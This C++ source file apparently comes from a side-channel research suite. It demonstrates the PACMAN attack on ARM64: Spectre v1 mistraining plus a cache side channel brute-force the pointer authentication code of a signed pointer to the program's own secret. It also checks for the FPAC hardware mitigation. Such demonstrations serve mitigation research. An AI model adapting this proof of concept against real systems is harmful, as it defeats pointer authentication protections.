/*
 * Copyright 2019 Google LLC
 *
 * Licensed under both the 3-Clause BSD License and the GPLv2, found in the
 * LICENSE and LICENSE.GPL-2.0 files, respectively, in the root directory.
 *
 * SPDX-License-Identifier: BSD-3-Clause OR GPL-2.0
 */

// PACMAN -- brute-forcing Pointer Authentication Code via speculative execution.
//
// Demonstrates that an attacker can recover the PAC of a signed pointer by
// brute-forcing all possible PAC values using speculative execution to
// suppress crashes from wrong guesses, and a cache side channel to detect
// the correct guess.
//
// Attack flow:
//   1. Sign a pointer to secret data with PACIASP (PAC stored in upper bits)
//   2. For each PAC guess (0..127):
//      a. Insert guessed PAC into the pointer
//      b. Use Spectre v1 PHT mistraining to create speculation window
//      c. Inside mispredicted branch: AUTIASP + dereference + oracle access
//      d. If PAC correct: dereference succeeds, oracle touched (cache hit)
//      e. If PAC wrong: dereference faults, oracle not touched (no cache hit)
//   3. Cache side channel reveals which PAC guess was correct
//
// PLATFORM NOTES:
// ARM64 with PAC support (Armv8.3-A+). Requires FEAT_PAuth.

#include "compiler_specifics.h"

#if !SAFESIDE_ARM64
#  error Unsupported architecture. ARM64 required.
#endif

#include <cstring>
#include <iostream>
#include <memory>
#if SAFESIDE_LINUX
#include <setjmp.h>
#include <signal.h>
#include <sys/auxv.h>
#endif

#include "cache_sidechannel.h"
#include "instr.h"
#include "local_content.h"
#include "utils.h"

#if SAFESIDE_LINUX
#ifndef HWCAP2_FPAC
#define HWCAP2_FPAC (1 << 23)
#endif

static sigjmp_buf fpac_jmp;
static void fpac_handler(int) { siglongjmp(fpac_jmp, 1); }

static bool HasFPAC() {
    unsigned long hwcap2 = getauxval(AT_HWCAP2);
    if (hwcap2 & HWCAP2_FPAC) return true;

    struct sigaction sa = {}, old;
    sa.sa_handler = fpac_handler;
    sigemptyset(&sa.sa_mask);
    sigaction(SIGILL, &sa, &old);

    bool fpac = false;
    if (sigsetjmp(fpac_jmp, 1) == 0) {
        asm volatile(
            "mov x30, #0\n"
            "autiasp\n"
            ::: "x30");
    } else {
        fpac = true;
    }

    sigaction(SIGILL, &old, NULL);
    return fpac;
}
#endif

// SP value captured at signing time. Must be restored before AUTIASP
// because PACIASP/AUTIASP use SP as the modifier.
static uint64_t g_sign_sp = 0;

// Sign pointer with PACIASP (key A, SP as modifier).
// PACIASP operates on X30 with SP as modifier, so we move the pointer
// into X30, sign it, and move the result back.
static uint64_t SignPointer(const void *ptr) {
    uint64_t result;
    asm volatile(
        "mov %1, sp\n"
        "mov x30, %2\n"
        "paciasp\n"
        "mov %0, x30\n"
        : "=r"(result), "=r"(g_sign_sp)
        : "r"(reinterpret_cast<uint64_t>(ptr))
        : "x30");
    return result;
}

// Extract PAC bits from signed pointer (bits 48-54 for 48-bit VA with TBI).
static uint64_t ExtractPAC(uint64_t signed_ptr) {
    return (signed_ptr >> 48) & 0x7F;
}

// Insert guessed PAC into pointer (replace bits 48-54).
static uint64_t InsertPAC(uint64_t raw_ptr, uint64_t guessed_pac) {
    return (raw_ptr & 0x0000FFFFFFFFFFFF) | (guessed_pac << 48);
}

// PACMAN gadget: authenticate + dereference + oracle access.
// Placed inside a mispredicted branch so wrong-PAC faults are squashed.
// AUTIASP operates on X30 with SP as modifier, so we restore the SP
// captured at signing time before authenticating.
static void PacmanGadget(uint64_t signed_ptr, const void *oracle_base) {
    asm volatile(
        "mov x4, sp\n"
        "mov sp, %[sign_sp]\n"
        "mov x30, %[ptr]\n"
        "autiasp\n"
        "mov sp, x4\n"
        "ldrb w3, [x30]\n"
        "add x3, %[oracle], x3, lsl 12\n"
        "ldrb w3, [x3]\n"
        :
        : [ptr] "r"(signed_ptr), [oracle] "r"(oracle_base),
          [sign_sp] "r"(g_sign_sp)
        : "x3", "x4", "x30", "memory");
}

// Try one PAC guess using Spectre v1 PHT mistraining.
// Returns true if the guess produced a cache hit (PAC likely correct).
static bool TryPACGuess(uint64_t guessed_signed_ptr,
                         const void *oracle_base,
                         char safe_char, int run) {
    CacheSideChannel sidechannel;
    const std::array<BigByte, 256> &oracle = sidechannel.GetOracle();

    std::unique_ptr<size_t> size_in_heap(new size_t(16));

    for (int attempt = 0; attempt < 10; ++attempt) {
        sidechannel.FlushOracle();

        for (size_t i = 0; i < 2048; ++i) {
            FlushDataCacheLine(size_in_heap.get());

            size_t local_offset = (i + 1) % 2048 ? 0 : 100;

            if (local_offset < *size_in_heap) {
                // Training: safe access
                ForceRead(&oracle[static_cast<unsigned char>(safe_char)]);
            } else {
                // Mispredicted: PACMAN gadget
                PacmanGadget(guessed_signed_ptr, oracle.data());
            }
        }

        std::pair<bool, char> result = sidechannel.RecomputeScores(safe_char);
        if (result.first) {
            return true;
        }
    }
    return false;
}

// Brute-force PAC value for a signed pointer.
static uint64_t BruteForcePAC(uint64_t signed_ptr, uint64_t raw_ptr) {
    char safe_char = 'x';

    std::cout << "[INFO] Signed pointer: 0x" << std::hex << signed_ptr << std::dec << "\n";
    std::cout << "[INFO] Actual PAC: " << ExtractPAC(signed_ptr) << "\n";
    std::cout << "[INFO] Brute-forcing PAC (0..127)...\n";
    std::cout.flush();

    for (uint64_t guess = 0; guess < 128; ++guess) {
        uint64_t guessed_ptr = InsertPAC(raw_ptr, guess);

        if (guess % 16 == 0) {
            std::cout << "[PROGRESS] Trying PAC " << guess << "/127...\n";
            std::cout.flush();
        }

        CacheSideChannel sidechannel;
        if (TryPACGuess(guessed_ptr, sidechannel.GetOracle().data(),
                         safe_char, 0)) {
            std::cout << "[SUCCESS] PAC found: " << guess << "\n";
            return guess;
        }
    }

    std::cerr << "[FAIL] Could not find PAC\n";
    return 0xFFFFFFFFFFFFFFFF;
}

int main() {
    std::cout << "PACMAN: Brute-forcing PAC via speculative execution\n";
    std::cout.flush();

#if SAFESIDE_LINUX
    if (HasFPAC()) {
        std::cout << "[INFO] FEAT_FPAC detected on this CPU.\n";
        std::cout << "[INFO] FPAC causes immediate architectural fault on PAC verification failure,\n";
        std::cout << "       even under speculative execution. This hardware mitigation effectively\n";
        std::cout << "       prevents PACMAN attacks.\n";
        std::cout << "[RESULT] PACMAN blocked by FPAC hardware mitigation.\n";
        std::cout << "Done!\n";
        return 0;
    }
    std::cout << "[INFO] No FPAC detected. PACMAN attack may succeed.\n";
#endif

    const char *secret = private_data;
    uint64_t raw_ptr = reinterpret_cast<uint64_t>(secret);
    uint64_t signed_ptr = SignPointer(secret);

    uint64_t actual_pac = ExtractPAC(signed_ptr);
    uint64_t found_pac = BruteForcePAC(signed_ptr, raw_ptr);

    if (found_pac == actual_pac) {
        std::cout << "\n[RESULT] PACMAN succeeded! Recovered PAC = "
                  << found_pac << "\n";
    } else {
        std::cout << "\n[RESULT] PACMAN failed. Expected " << actual_pac
                  << ", got " << found_pac << "\n";
    }

    std::cout << "Done!\n";
}
